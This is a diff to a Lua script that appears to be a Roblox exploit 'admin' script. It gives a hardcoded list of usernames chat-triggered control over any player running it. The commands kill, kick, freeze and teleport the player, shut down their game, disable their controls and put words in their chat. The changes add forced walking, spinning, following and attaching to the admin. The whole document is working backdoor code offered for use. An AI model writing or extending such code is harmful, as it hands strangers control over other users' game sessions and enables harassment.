@@ -18,6 +18,14 @@ local Admins = {"Pxrple001","bestgamer_pogi24","FEWithoutEffort","Aintnoway123n"
 :laydown
 :dance
 :dance all
+:walktome
+:avoidbang
+:spin
+:unspin
+:followme
+:unfollowme
+:attachtome
+:unattachtome
 :fling
 :jump
 :sit
@@ -93,6 +101,9 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
 
 
    ---Execute Command Function
+   local Attached = false
+   local Spinning = false
+   local Following = false
    local function ExecuteAdminCMD(admin)
     game.Players[admin.Name].Chatted:Connect(function(admin_msg)
     local MyName = game.Players.LocalPlayer.Name
@@ -115,13 +126,13 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
           end
        end
     end
-    if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= Ghostplayer then
+    if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        game.Players.LocalPlayer.Character.Head:Destroy()
     elseif admin_msg == ":freeze "..MyName or admin_msg == ":freeze "..MyDisplayName then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
     elseif admin_msg == ":unfreeze "..MyName or admin_msg == ":unfreeze "..MyDisplayName then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-    elseif string.find(admin_msg.." ", ":kick "..MyName.." ") or string.find(admin_msg.." ", ":kick "..MyDisplayName.." ") or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= Ghostplayer then
+    elseif string.find(admin_msg.." ", ":kick "..MyName.." ") or string.find(admin_msg.." ", ":kick "..MyDisplayName.." ") or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= admin.Name and MyName ~= Ghostplayer then
        if string.find(admin_msg, MyName) then
           admin_msg = string.gsub(admin_msg, ":kick "..MyName, "")
        elseif string.find(admin_msg, MyDisplayName) then
@@ -133,10 +144,10 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
           admin_msg = "\n"..admin_msg
        end
        game.Players.LocalPlayer:Kick(admin_msg)
-    elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= Ghostplayer then
+    elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        game:Shutdown()
-    elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= Ghostplayer then
-       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Ghostplayer].Character.HumanoidRootPart.CFrame
+    elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
     elseif admin_msg == ":disablecontrol "..MyName or admin_msg == ":disablecontrol "..MyDisplayName then
        controls = require(game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule):GetControls() controls:Disable()
     elseif admin_msg == ":enablecontrol "..MyName or admin_msg == ":enablecontrol "..MyDisplayName then
@@ -148,7 +159,7 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
        for _, v in ipairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
          v:Stop()
        end
-    elseif admin_msg == ":dance "..MyName or admin_msg == ":dance "..MyDisplayName or admin_msg == ":dance all" and game.Players.LocalPlayer.Name ~= Ghostplayer then
+    elseif admin_msg == ":dance "..MyName or admin_msg == ":dance "..MyDisplayName or admin_msg == ":dance all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        SendMessage("/e dance")
     elseif admin_msg == ":fling "..MyName or admin_msg == ":fling "..MyDisplayName then
        bambam = Instance.new("BodyThrust")
@@ -159,10 +170,44 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
        game.Players.LocalPlayer.Character.Humanoid.Sit = true
     elseif admin_msg == ":jump "..MyName or admin_msg == ":jump "..MyDisplayName then
        game.Players.LocalPlayer.Character.Humanoid.Jump = true
+    elseif admin_msg == ":walktome "..MyName or admin_msg == ":walktome "..MyDisplayName then
+       game.Players.LocalPlayer.Character.Humanoid:MoveTo(admin.Character:FindFirstChild("HumanoidRootPart").Position)
+    elseif admin_msg == ":avoidbang "..MyName or admin_msg == ":avoidbang "..MyDisplayName then
+       workspace.FallenPartsDestroyHeight = -1000
+       local lastCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(0, -500, 0))
+       wait(0.7)
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastCFrame
+       workspace.FallenPartsDestroyHeight = -500
+    elseif admin_msg == ":spin "..MyName or admin_msg == ":spin "..MyDisplayName then
+       Spinning = true
+       repeat
+         wait()
+         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(0),math.rad(10),math.rad(0))
+       until Spinning == false
+    elseif admin_msg == ":unspin "..MyName or admin_msg == ":unspin "..MyDisplayName then
+       Spinning = false
+    elseif admin_msg == ":followme "..MyName or admin_msg == ":followme "..MyDisplayName then
+       Following = true
+       repeat
+         game.Players.LocalPlayer.Character.Humanoid:MoveTo(admin.Character:FindFirstChild("HumanoidRootPart").Position)
+       until Following == false
+    elseif admin_msg == ":unfollowme "..MyName or admin_msg == ":unfollowme "..MyDisplayName then
+       Following = false
+    elseif admin_msg == ":attachtome "..MyName or admin_msg == ":attachtome "..MyDisplayName then
+       Attached = true
+       repeat
+         wait()
+         if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and admin.Character:FindFirstChild("HumanoidRootPart") then
+            game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = admin.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0,0,1)
+         end
+       until Attached == false
+    elseif admin_msg == ":unattachtome "..MyName or admin_msg == ":unattachtome "..MyDisplayName then
+       Attached = false
     elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":say "..MyDisplayName.." ") then
        admin_msg = admin_msg:sub(FindIndex(admin_msg, " ", 2), string.len(admin_msg))
        SendMessage(admin_msg)
-    elseif admin_msg == ":" and MyName ~= Ghostplayer then
+    elseif admin_msg == ":" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        SendMessage("Im Here")
        wait(0.1)
        for i,v in pairs(game.CoreGui:GetDescendants()) do
